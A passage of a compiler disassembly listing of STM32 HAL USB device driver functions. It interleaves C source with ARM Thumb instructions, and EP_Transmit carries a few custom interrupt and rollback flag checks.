 8001fe6:	2b00      	cmp	r3, #0
 8001fe8:	d027      	beq.n	800203a <HAL_PCD_IRQHandler+0x16e>
  {
    /* Force low-power mode in the macrocell */
    hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_FSUSP;
 8001fea:	687b      	ldr	r3, [r7, #4]
 8001fec:	681b      	ldr	r3, [r3, #0]
 8001fee:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8001ff2:	b29a      	uxth	r2, r3
 8001ff4:	687b      	ldr	r3, [r7, #4]
 8001ff6:	681b      	ldr	r3, [r3, #0]
 8001ff8:	f042 0208 	orr.w	r2, r2, #8
 8001ffc:	b292      	uxth	r2, r2
 8001ffe:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

    /* clear of the ISTR bit must be done after setting of CNTR_FSUSP */
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_SUSP);
 8002002:	687b      	ldr	r3, [r7, #4]
 8002004:	681b      	ldr	r3, [r3, #0]
 8002006:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 800200a:	b29a      	uxth	r2, r3
 800200c:	687b      	ldr	r3, [r7, #4]
 800200e:	681b      	ldr	r3, [r3, #0]
 8002010:	f422 6200 	bic.w	r2, r2, #2048	; 0x800
 8002014:	b292      	uxth	r2, r2
 8002016:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_LPMODE;
 800201a:	687b      	ldr	r3, [r7, #4]
 800201c:	681b      	ldr	r3, [r3, #0]
 800201e:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8002022:	b29a      	uxth	r2, r3
 8002024:	687b      	ldr	r3, [r7, #4]
 8002026:	681b      	ldr	r3, [r3, #0]
 8002028:	f042 0204 	orr.w	r2, r2, #4
 800202c:	b292      	uxth	r2, r2
 800202e:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->SuspendCallback(hpcd);
#else
    HAL_PCD_SuspendCallback(hpcd);
 8002032:	6878      	ldr	r0, [r7, #4]
 8002034:	f00a fcdc 	bl	800c9f0 <HAL_PCD_SuspendCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    return;
 8002038:	e06c      	b.n	8002114 <HAL_PCD_IRQHandler+0x248>
  }

  /* Handle LPM Interrupt */
  if ((wIstr & USB_ISTR_L1REQ) == USB_ISTR_L1REQ)
 800203a:	68fb      	ldr	r3, [r7, #12]
 800203c:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8002040:	2b00      	cmp	r3, #0
 8002042:	d040      	beq.n	80020c6 <HAL_PCD_IRQHandler+0x1fa>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_L1REQ);
 8002044:	687b      	ldr	r3, [r7, #4]
 8002046:	681b      	ldr	r3, [r3, #0]
 8002048:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 800204c:	b29a      	uxth	r2, r3
 800204e:	687b      	ldr	r3, [r7, #4]
 8002050:	681b      	ldr	r3, [r3, #0]
 8002052:	f022 0280 	bic.w	r2, r2, #128	; 0x80
 8002056:	b292      	uxth	r2, r2
 8002058:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44
    if (hpcd->LPM_State == LPM_L0)
 800205c:	687b      	ldr	r3, [r7, #4]
 800205e:	f893 32e0 	ldrb.w	r3, [r3, #736]	; 0x2e0
 8002062:	2b00      	cmp	r3, #0
 8002064:	d12b      	bne.n	80020be <HAL_PCD_IRQHandler+0x1f2>
    {
      /* Force suspend and low-power mode before going to L1 state*/
      hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_LPMODE;
 8002066:	687b      	ldr	r3, [r7, #4]
 8002068:	681b      	ldr	r3, [r3, #0]
 800206a:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 800206e:	b29a      	uxth	r2, r3
 8002070:	687b      	ldr	r3, [r7, #4]
 8002072:	681b      	ldr	r3, [r3, #0]
 8002074:	f042 0204 	orr.w	r2, r2, #4
 8002078:	b292      	uxth	r2, r2
 800207a:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40
      hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_FSUSP;
 800207e:	687b      	ldr	r3, [r7, #4]
 8002080:	681b      	ldr	r3, [r3, #0]
 8002082:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8002086:	b29a      	uxth	r2, r3
 8002088:	687b      	ldr	r3, [r7, #4]
 800208a:	681b      	ldr	r3, [r3, #0]
 800208c:	f042 0208 	orr.w	r2, r2, #8
 8002090:	b292      	uxth	r2, r2
 8002092:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

      hpcd->LPM_State = LPM_L1;
 8002096:	687b      	ldr	r3, [r7, #4]
 8002098:	2201      	movs	r2, #1
 800209a:	f883 22e0 	strb.w	r2, [r3, #736]	; 0x2e0
      hpcd->BESL = ((uint32_t)hpcd->Instance->LPMCSR & USB_LPMCSR_BESL) >> 2;
 800209e:	687b      	ldr	r3, [r7, #4]
 80020a0:	681b      	ldr	r3, [r3, #0]
 80020a2:	f8b3 3054 	ldrh.w	r3, [r3, #84]	; 0x54
 80020a6:	b29b      	uxth	r3, r3
 80020a8:	089b      	lsrs	r3, r3, #2
 80020aa:	f003 023c 	and.w	r2, r3, #60	; 0x3c
 80020ae:	687b      	ldr	r3, [r7, #4]
 80020b0:	f8c3 22e4 	str.w	r2, [r3, #740]	; 0x2e4
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->LPMCallback(hpcd, PCD_LPM_L1_ACTIVE);
#else
      HAL_PCDEx_LPM_Callback(hpcd, PCD_LPM_L1_ACTIVE);
 80020b4:	2101      	movs	r1, #1
 80020b6:	6878      	ldr	r0, [r7, #4]
 80020b8:	f00a ff58 	bl	800cf6c <HAL_PCDEx_LPM_Callback>
#else
      HAL_PCD_SuspendCallback(hpcd);
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
    }

    return;
 80020bc:	e02a      	b.n	8002114 <HAL_PCD_IRQHandler+0x248>
      HAL_PCD_SuspendCallback(hpcd);
 80020be:	6878      	ldr	r0, [r7, #4]
 80020c0:	f00a fc96 	bl	800c9f0 <HAL_PCD_SuspendCallback>
    return;
 80020c4:	e026      	b.n	8002114 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_SOF) == USB_ISTR_SOF)
 80020c6:	68fb      	ldr	r3, [r7, #12]
 80020c8:	f403 7300 	and.w	r3, r3, #512	; 0x200
 80020cc:	2b00      	cmp	r3, #0
 80020ce:	d00f      	beq.n	80020f0 <HAL_PCD_IRQHandler+0x224>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_SOF);
 80020d0:	687b      	ldr	r3, [r7, #4]
 80020d2:	681b      	ldr	r3, [r3, #0]
 80020d4:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 80020d8:	b29a      	uxth	r2, r3
 80020da:	687b      	ldr	r3, [r7, #4]
 80020dc:	681b      	ldr	r3, [r3, #0]
 80020de:	f422 7200 	bic.w	r2, r2, #512	; 0x200
 80020e2:	b292      	uxth	r2, r2
 80020e4:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->SOFCallback(hpcd);
#else
    HAL_PCD_SOFCallback(hpcd);
 80020e8:	6878      	ldr	r0, [r7, #4]
 80020ea:	f00a fc54 	bl	800c996 <HAL_PCD_SOFCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    return;
 80020ee:	e011      	b.n	8002114 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_ESOF) == USB_ISTR_ESOF)
 80020f0:	68fb      	ldr	r3, [r7, #12]
 80020f2:	f403 7380 	and.w	r3, r3, #256	; 0x100
 80020f6:	2b00      	cmp	r3, #0
 80020f8:	d00c      	beq.n	8002114 <HAL_PCD_IRQHandler+0x248>
  {
    /* clear ESOF flag in ISTR */
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_ESOF);
 80020fa:	687b      	ldr	r3, [r7, #4]
 80020fc:	681b      	ldr	r3, [r3, #0]
 80020fe:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002102:	b29a      	uxth	r2, r3
 8002104:	687b      	ldr	r3, [r7, #4]
 8002106:	681b      	ldr	r3, [r3, #0]
 8002108:	f422 7280 	bic.w	r2, r2, #256	; 0x100
 800210c:	b292      	uxth	r2, r2
 800210e:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 8002112:	bf00      	nop
  }
}
 8002114:	3710      	adds	r7, #16
 8002116:	46bd      	mov	sp, r7
 8002118:	bd80      	pop	{r7, pc}

0800211a <HAL_PCD_SetAddress>:
  * @param  hpcd PCD handle
  * @param  address new device address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_SetAddress(PCD_HandleTypeDef *hpcd, uint8_t address)
{
 800211a:	b580      	push	{r7, lr}
 800211c:	b082      	sub	sp, #8
 800211e:	af00      	add	r7, sp, #0
 8002120:	6078      	str	r0, [r7, #4]
 8002122:	460b      	mov	r3, r1
 8002124:	70fb      	strb	r3, [r7, #3]
  __HAL_LOCK(hpcd);
 8002126:	687b      	ldr	r3, [r7, #4]
 8002128:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 800212c:	2b01      	cmp	r3, #1
 800212e:	d101      	bne.n	8002134 <HAL_PCD_SetAddress+0x1a>
 8002130:	2302      	movs	r3, #2
 8002132:	e013      	b.n	800215c <HAL_PCD_SetAddress+0x42>
 8002134:	687b      	ldr	r3, [r7, #4]
 8002136:	2201      	movs	r2, #1
 8002138:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  hpcd->USB_Address = address;
 800213c:	687b      	ldr	r3, [r7, #4]
 800213e:	78fa      	ldrb	r2, [r7, #3]
 8002140:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
  (void)USB_SetDevAddress(hpcd->Instance, address);
 8002144:	687b      	ldr	r3, [r7, #4]
 8002146:	681b      	ldr	r3, [r3, #0]
 8002148:	78fa      	ldrb	r2, [r7, #3]
 800214a:	4611      	mov	r1, r2
 800214c:	4618      	mov	r0, r3
 800214e:	f006 f94a 	bl	80083e6 <USB_SetDevAddress>
  __HAL_UNLOCK(hpcd);
 8002152:	687b      	ldr	r3, [r7, #4]
 8002154:	2200      	movs	r2, #0
 8002156:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 800215a:	2300      	movs	r3, #0
}
 800215c:	4618      	mov	r0, r3
 800215e:	3708      	adds	r7, #8
 8002160:	46bd      	mov	sp, r7
 8002162:	bd80      	pop	{r7, pc}

08002164 <HAL_PCD_EP_Open>:
  * @param  ep_type endpoint type
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Open(PCD_HandleTypeDef *hpcd, uint8_t ep_addr,
                                  uint16_t ep_mps, uint8_t ep_type)
{
 8002164:	b580      	push	{r7, lr}
 8002166:	b084      	sub	sp, #16
 8002168:	af00      	add	r7, sp, #0
 800216a:	6078      	str	r0, [r7, #4]
 800216c:	4608      	mov	r0, r1
 800216e:	4611      	mov	r1, r2
 8002170:	461a      	mov	r2, r3
 8002172:	4603      	mov	r3, r0
 8002174:	70fb      	strb	r3, [r7, #3]
 8002176:	460b      	mov	r3, r1
 8002178:	803b      	strh	r3, [r7, #0]
 800217a:	4613      	mov	r3, r2
 800217c:	70bb      	strb	r3, [r7, #2]
  HAL_StatusTypeDef  ret = HAL_OK;
 800217e:	2300      	movs	r3, #0
 8002180:	72fb      	strb	r3, [r7, #11]
  PCD_EPTypeDef *ep;

  if ((ep_addr & 0x80U) == 0x80U)
 8002182:	f997 3003 	ldrsb.w	r3, [r7, #3]
 8002186:	2b00      	cmp	r3, #0
 8002188:	da0e      	bge.n	80021a8 <HAL_PCD_EP_Open+0x44>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 800218a:	78fb      	ldrb	r3, [r7, #3]
 800218c:	f003 0307 	and.w	r3, r3, #7
 8002190:	1c5a      	adds	r2, r3, #1
 8002192:	4613      	mov	r3, r2
 8002194:	009b      	lsls	r3, r3, #2
 8002196:	4413      	add	r3, r2
 8002198:	00db      	lsls	r3, r3, #3
 800219a:	687a      	ldr	r2, [r7, #4]
 800219c:	4413      	add	r3, r2
 800219e:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 80021a0:	68fb      	ldr	r3, [r7, #12]
 80021a2:	2201      	movs	r2, #1
 80021a4:	705a      	strb	r2, [r3, #1]
 80021a6:	e00e      	b.n	80021c6 <HAL_PCD_EP_Open+0x62>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 80021a8:	78fb      	ldrb	r3, [r7, #3]
 80021aa:	f003 0207 	and.w	r2, r3, #7
 80021ae:	4613      	mov	r3, r2
 80021b0:	009b      	lsls	r3, r3, #2
 80021b2:	4413      	add	r3, r2
 80021b4:	00db      	lsls	r3, r3, #3
 80021b6:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 80021ba:	687a      	ldr	r2, [r7, #4]
 80021bc:	4413      	add	r3, r2
 80021be:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 80021c0:	68fb      	ldr	r3, [r7, #12]
 80021c2:	2200      	movs	r2, #0
 80021c4:	705a      	strb	r2, [r3, #1]
  }

  ep->num = ep_addr & EP_ADDR_MSK;
 80021c6:	78fb      	ldrb	r3, [r7, #3]
 80021c8:	f003 0307 	and.w	r3, r3, #7
 80021cc:	b2da      	uxtb	r2, r3
 80021ce:	68fb      	ldr	r3, [r7, #12]
 80021d0:	701a      	strb	r2, [r3, #0]
  ep->maxpacket = ep_mps;
 80021d2:	883a      	ldrh	r2, [r7, #0]
 80021d4:	68fb      	ldr	r3, [r7, #12]
 80021d6:	611a      	str	r2, [r3, #16]
  ep->type = ep_type;
 80021d8:	68fb      	ldr	r3, [r7, #12]
 80021da:	78ba      	ldrb	r2, [r7, #2]
 80021dc:	70da      	strb	r2, [r3, #3]
    ep->tx_fifo_num = ep->num;
  }
#endif /* defined (USB_OTG_FS) */

  /* Set initial data PID. */
  if (ep_type == EP_TYPE_BULK)
 80021de:	78bb      	ldrb	r3, [r7, #2]
 80021e0:	2b02      	cmp	r3, #2
 80021e2:	d102      	bne.n	80021ea <HAL_PCD_EP_Open+0x86>
  {
    ep->data_pid_start = 0U;
 80021e4:	68fb      	ldr	r3, [r7, #12]
 80021e6:	2200      	movs	r2, #0
 80021e8:	711a      	strb	r2, [r3, #4]
  }

  __HAL_LOCK(hpcd);
 80021ea:	687b      	ldr	r3, [r7, #4]
 80021ec:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 80021f0:	2b01      	cmp	r3, #1
 80021f2:	d101      	bne.n	80021f8 <HAL_PCD_EP_Open+0x94>
 80021f4:	2302      	movs	r3, #2
 80021f6:	e00e      	b.n	8002216 <HAL_PCD_EP_Open+0xb2>
 80021f8:	687b      	ldr	r3, [r7, #4]
 80021fa:	2201      	movs	r2, #1
 80021fc:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  (void)USB_ActivateEndpoint(hpcd->Instance, ep);
 8002200:	687b      	ldr	r3, [r7, #4]
 8002202:	681b      	ldr	r3, [r3, #0]
 8002204:	68f9      	ldr	r1, [r7, #12]
 8002206:	4618      	mov	r0, r3
 8002208:	f003 fe8c 	bl	8005f24 <USB_ActivateEndpoint>
  __HAL_UNLOCK(hpcd);
 800220c:	687b      	ldr	r3, [r7, #4]
 800220e:	2200      	movs	r2, #0
 8002210:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return ret;
 8002214:	7afb      	ldrb	r3, [r7, #11]
}
 8002216:	4618      	mov	r0, r3
 8002218:	3710      	adds	r7, #16
 800221a:	46bd      	mov	sp, r7
 800221c:	bd80      	pop	{r7, pc}

0800221e <HAL_PCD_EP_Close>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Close(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 800221e:	b580      	push	{r7, lr}
 8002220:	b084      	sub	sp, #16
 8002222:	af00      	add	r7, sp, #0
 8002224:	6078      	str	r0, [r7, #4]
 8002226:	460b      	mov	r3, r1
 8002228:	70fb      	strb	r3, [r7, #3]
  PCD_EPTypeDef *ep;

  if ((ep_addr & 0x80U) == 0x80U)
 800222a:	f997 3003 	ldrsb.w	r3, [r7, #3]
 800222e:	2b00      	cmp	r3, #0
 8002230:	da0e      	bge.n	8002250 <HAL_PCD_EP_Close+0x32>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 8002232:	78fb      	ldrb	r3, [r7, #3]
 8002234:	f003 0307 	and.w	r3, r3, #7
 8002238:	1c5a      	adds	r2, r3, #1
 800223a:	4613      	mov	r3, r2
 800223c:	009b      	lsls	r3, r3, #2
 800223e:	4413      	add	r3, r2
 8002240:	00db      	lsls	r3, r3, #3
 8002242:	687a      	ldr	r2, [r7, #4]
 8002244:	4413      	add	r3, r2
 8002246:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 8002248:	68fb      	ldr	r3, [r7, #12]
 800224a:	2201      	movs	r2, #1
 800224c:	705a      	strb	r2, [r3, #1]
 800224e:	e00e      	b.n	800226e <HAL_PCD_EP_Close+0x50>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 8002250:	78fb      	ldrb	r3, [r7, #3]
 8002252:	f003 0207 	and.w	r2, r3, #7
 8002256:	4613      	mov	r3, r2
 8002258:	009b      	lsls	r3, r3, #2
 800225a:	4413      	add	r3, r2
 800225c:	00db      	lsls	r3, r3, #3
 800225e:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002262:	687a      	ldr	r2, [r7, #4]
 8002264:	4413      	add	r3, r2
 8002266:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 8002268:	68fb      	ldr	r3, [r7, #12]
 800226a:	2200      	movs	r2, #0
 800226c:	705a      	strb	r2, [r3, #1]
  }
  ep->num = ep_addr & EP_ADDR_MSK;
 800226e:	78fb      	ldrb	r3, [r7, #3]
 8002270:	f003 0307 	and.w	r3, r3, #7
 8002274:	b2da      	uxtb	r2, r3
 8002276:	68fb      	ldr	r3, [r7, #12]
 8002278:	701a      	strb	r2, [r3, #0]

  __HAL_LOCK(hpcd);
 800227a:	687b      	ldr	r3, [r7, #4]
 800227c:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8002280:	2b01      	cmp	r3, #1
 8002282:	d101      	bne.n	8002288 <HAL_PCD_EP_Close+0x6a>
 8002284:	2302      	movs	r3, #2
 8002286:	e00e      	b.n	80022a6 <HAL_PCD_EP_Close+0x88>
 8002288:	687b      	ldr	r3, [r7, #4]
 800228a:	2201      	movs	r2, #1
 800228c:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  (void)USB_DeactivateEndpoint(hpcd->Instance, ep);
 8002290:	687b      	ldr	r3, [r7, #4]
 8002292:	681b      	ldr	r3, [r3, #0]
 8002294:	68f9      	ldr	r1, [r7, #12]
 8002296:	4618      	mov	r0, r3
 8002298:	f004 fa08 	bl	80066ac <USB_DeactivateEndpoint>
  __HAL_UNLOCK(hpcd);
 800229c:	687b      	ldr	r3, [r7, #4]
 800229e:	2200      	movs	r2, #0
 80022a0:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  return HAL_OK;
 80022a4:	2300      	movs	r3, #0
}
 80022a6:	4618      	mov	r0, r3
 80022a8:	3710      	adds	r7, #16
 80022aa:	46bd      	mov	sp, r7
 80022ac:	bd80      	pop	{r7, pc}

080022ae <HAL_PCD_EP_Receive>:
  * @param  pBuf pointer to the reception buffer
  * @param  len amount of data to be received
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Receive(PCD_HandleTypeDef *hpcd, uint8_t ep_addr, uint8_t *pBuf, uint32_t len)
{
 80022ae:	b580      	push	{r7, lr}
 80022b0:	b086      	sub	sp, #24
 80022b2:	af00      	add	r7, sp, #0
 80022b4:	60f8      	str	r0, [r7, #12]
 80022b6:	607a      	str	r2, [r7, #4]
 80022b8:	603b      	str	r3, [r7, #0]
 80022ba:	460b      	mov	r3, r1
 80022bc:	72fb      	strb	r3, [r7, #11]
  PCD_EPTypeDef *ep;

  ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 80022be:	7afb      	ldrb	r3, [r7, #11]
 80022c0:	f003 0207 	and.w	r2, r3, #7
 80022c4:	4613      	mov	r3, r2
 80022c6:	009b      	lsls	r3, r3, #2
 80022c8:	4413      	add	r3, r2
 80022ca:	00db      	lsls	r3, r3, #3
 80022cc:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 80022d0:	68fa      	ldr	r2, [r7, #12]
 80022d2:	4413      	add	r3, r2
 80022d4:	617b      	str	r3, [r7, #20]

  /*setup and start the Xfer */
  ep->xfer_buff = pBuf;
 80022d6:	697b      	ldr	r3, [r7, #20]
 80022d8:	687a      	ldr	r2, [r7, #4]
 80022da:	615a      	str	r2, [r3, #20]
  ep->xfer_len = len;
 80022dc:	697b      	ldr	r3, [r7, #20]
 80022de:	683a      	ldr	r2, [r7, #0]
 80022e0:	619a      	str	r2, [r3, #24]
  ep->xfer_count = 0U;
 80022e2:	697b      	ldr	r3, [r7, #20]
 80022e4:	2200      	movs	r2, #0
 80022e6:	61da      	str	r2, [r3, #28]
  ep->is_in = 0U;
 80022e8:	697b      	ldr	r3, [r7, #20]
 80022ea:	2200      	movs	r2, #0
 80022ec:	705a      	strb	r2, [r3, #1]
  ep->num = ep_addr & EP_ADDR_MSK;
 80022ee:	7afb      	ldrb	r3, [r7, #11]
 80022f0:	f003 0307 	and.w	r3, r3, #7
 80022f4:	b2da      	uxtb	r2, r3
 80022f6:	697b      	ldr	r3, [r7, #20]
 80022f8:	701a      	strb	r2, [r3, #0]

  (void)USB_EPStartXfer(hpcd->Instance, ep);
 80022fa:	68fb      	ldr	r3, [r7, #12]
 80022fc:	681b      	ldr	r3, [r3, #0]
 80022fe:	6979      	ldr	r1, [r7, #20]
 8002300:	4618      	mov	r0, r3
 8002302:	f004 fbc0 	bl	8006a86 <USB_EPStartXfer>

  return HAL_OK;
 8002306:	2300      	movs	r3, #0
}
 8002308:	4618      	mov	r0, r3
 800230a:	3718      	adds	r7, #24
 800230c:	46bd      	mov	sp, r7
 800230e:	bd80      	pop	{r7, pc}

08002310 <HAL_PCD_EP_GetRxCount>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval Data Size
  */
uint32_t HAL_PCD_EP_GetRxCount(PCD_HandleTypeDef const *hpcd, uint8_t ep_addr)
{
 8002310:	b480      	push	{r7}
 8002312:	b083      	sub	sp, #12
 8002314:	af00      	add	r7, sp, #0
 8002316:	6078      	str	r0, [r7, #4]
 8002318:	460b      	mov	r3, r1
 800231a:	70fb      	strb	r3, [r7, #3]
  return hpcd->OUT_ep[ep_addr & EP_ADDR_MSK].xfer_count;
 800231c:	78fb      	ldrb	r3, [r7, #3]
 800231e:	f003 0207 	and.w	r2, r3, #7
 8002322:	6879      	ldr	r1, [r7, #4]
 8002324:	4613      	mov	r3, r2
 8002326:	009b      	lsls	r3, r3, #2
 8002328:	4413      	add	r3, r2
 800232a:	00db      	lsls	r3, r3, #3
 800232c:	440b      	add	r3, r1
 800232e:	f503 73c2 	add.w	r3, r3, #388	; 0x184
 8002332:	681b      	ldr	r3, [r3, #0]
}
 8002334:	4618      	mov	r0, r3
 8002336:	370c      	adds	r7, #12
 8002338:	46bd      	mov	sp, r7
 800233a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800233e:	4770      	bx	lr

08002340 <HAL_PCD_EP_Transmit>:
  * @param  pBuf pointer to the transmission buffer
  * @param  len amount of data to be sent
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Transmit(PCD_HandleTypeDef *hpcd, uint8_t ep_addr, uint8_t *pBuf, uint32_t len)
{
 8002340:	b580      	push	{r7, lr}
 8002342:	b086      	sub	sp, #24
 8002344:	af00      	add	r7, sp, #0
 8002346:	60f8      	str	r0, [r7, #12]
 8002348:	607a      	str	r2, [r7, #4]
 800234a:	603b      	str	r3, [r7, #0]
 800234c:	460b      	mov	r3, r1
 800234e:	72fb      	strb	r3, [r7, #11]
  PCD_EPTypeDef *ep;

  ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 8002350:	7afb      	ldrb	r3, [r7, #11]
 8002352:	f003 0307 	and.w	r3, r3, #7
 8002356:	1c5a      	adds	r2, r3, #1
 8002358:	4613      	mov	r3, r2
 800235a:	009b      	lsls	r3, r3, #2
 800235c:	4413      	add	r3, r2
 800235e:	00db      	lsls	r3, r3, #3
 8002360:	68fa      	ldr	r2, [r7, #12]
 8002362:	4413      	add	r3, r2
 8002364:	617b      	str	r3, [r7, #20]

  /*setup and start the Xfer */
  ep->xfer_buff = pBuf;
 8002366:	697b      	ldr	r3, [r7, #20]
 8002368:	687a      	ldr	r2, [r7, #4]
 800236a:	615a      	str	r2, [r3, #20]
  ep->xfer_len = len;
 800236c:	697b      	ldr	r3, [r7, #20]
 800236e:	683a      	ldr	r2, [r7, #0]
 8002370:	619a      	str	r2, [r3, #24]
#if defined (USB)
  ep->xfer_fill_db = 1U;
 8002372:	697b      	ldr	r3, [r7, #20]
 8002374:	2201      	movs	r2, #1
 8002376:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
  ep->xfer_len_db = len;
 800237a:	697b      	ldr	r3, [r7, #20]
 800237c:	683a      	ldr	r2, [r7, #0]
 800237e:	621a      	str	r2, [r3, #32]
#endif /* defined (USB) */
  ep->xfer_count = 0U;
 8002380:	697b      	ldr	r3, [r7, #20]
 8002382:	2200      	movs	r2, #0
 8002384:	61da      	str	r2, [r3, #28]
  ep->is_in = 1U;
 8002386:	697b      	ldr	r3, [r7, #20]
 8002388:	2201      	movs	r2, #1
 800238a:	705a      	strb	r2, [r3, #1]
  ep->num = ep_addr & EP_ADDR_MSK;
 800238c:	7afb      	ldrb	r3, [r7, #11]
 800238e:	f003 0307 	and.w	r3, r3, #7
 8002392:	b2da      	uxtb	r2, r3
 8002394:	697b      	ldr	r3, [r7, #20]
 8002396:	701a      	strb	r2, [r3, #0]

  //Determine whether to generate an interrupt:
  if((recv_buffer[0]&0x02) != 0x02)
 8002398:	4b0e      	ldr	r3, [pc, #56]	; (80023d4 <HAL_PCD_EP_Transmit+0x94>)
 800239a:	781b      	ldrb	r3, [r3, #0]
 800239c:	f003 0302 	and.w	r3, r3, #2
 80023a0:	2b00      	cmp	r3, #0
 80023a2:	d102      	bne.n	80023aa <HAL_PCD_EP_Transmit+0x6a>
	  InterruptFlag = 1;
 80023a4:	4b0c      	ldr	r3, [pc, #48]	; (80023d8 <HAL_PCD_EP_Transmit+0x98>)
 80023a6:	2201      	movs	r2, #1
 80023a8:	601a      	str	r2, [r3, #0]

  (void)USB_EPStartXfer(hpcd->Instance, ep);
 80023aa:	68fb      	ldr	r3, [r7, #12]
 80023ac:	681b      	ldr	r3, [r3, #0]
 80023ae:	6979      	ldr	r1, [r7, #20]
 80023b0:	4618      	mov	r0, r3
 80023b2:	f004 fb68 	bl	8006a86 <USB_EPStartXfer>

  //Output test to choose whether to RollBack:
  if((recv_buffer[0]&0x02) != 0x02)
 80023b6:	4b07      	ldr	r3, [pc, #28]	; (80023d4 <HAL_PCD_EP_Transmit+0x94>)
 80023b8:	781b      	ldrb	r3, [r3, #0]
 80023ba:	f003 0302 	and.w	r3, r3, #2
 80023be:	2b00      	cmp	r3, #0
 80023c0:	d102      	bne.n	80023c8 <HAL_PCD_EP_Transmit+0x88>
	  NeedRollBack = 1;
 80023c2:	4b06      	ldr	r3, [pc, #24]	; (80023dc <HAL_PCD_EP_Transmit+0x9c>)
 80023c4:	2201      	movs	r2, #1
 80023c6:	601a      	str	r2, [r3, #0]
  return HAL_OK;
 80023c8:	2300      	movs	r3, #0
}
 80023ca:	4618      	mov	r0, r3
 80023cc:	3718      	adds	r7, #24
 80023ce:	46bd      	mov	sp, r7
 80023d0:	bd80      	pop	{r7, pc}
 80023d2:	bf00      	nop
 80023d4:	2000026c 	.word	0x2000026c
 80023d8:	20000270 	.word	0x20000270
 80023dc:	2000027c 	.word	0x2000027c

080023e0 <HAL_PCD_EP_SetStall>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_SetStall(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 80023e0:	b580      	push	{r7, lr}
 80023e2:	b084      	sub	sp, #16
 80023e4:	af00      	add	r7, sp, #0
 80023e6:	6078      	str	r0, [r7, #4]
 80023e8:	460b      	mov	r3, r1
 80023ea:	70fb      	strb	r3, [r7, #3]
  PCD_EPTypeDef *ep;

  if (((uint32_t)ep_addr & EP_ADDR_MSK) > hpcd->Init.dev_endpoints)
 80023ec:	78fb      	ldrb	r3, [r7, #3]
 80023ee:	f003 0207 	and.w	r2, r3, #7
 80023f2:	687b      	ldr	r3, [r7, #4]
 80023f4:	685b      	ldr	r3, [r3, #4]
 80023f6:	429a      	cmp	r2, r3
 80023f8:	d901      	bls.n	80023fe <HAL_PCD_EP_SetStall+0x1e>
  {
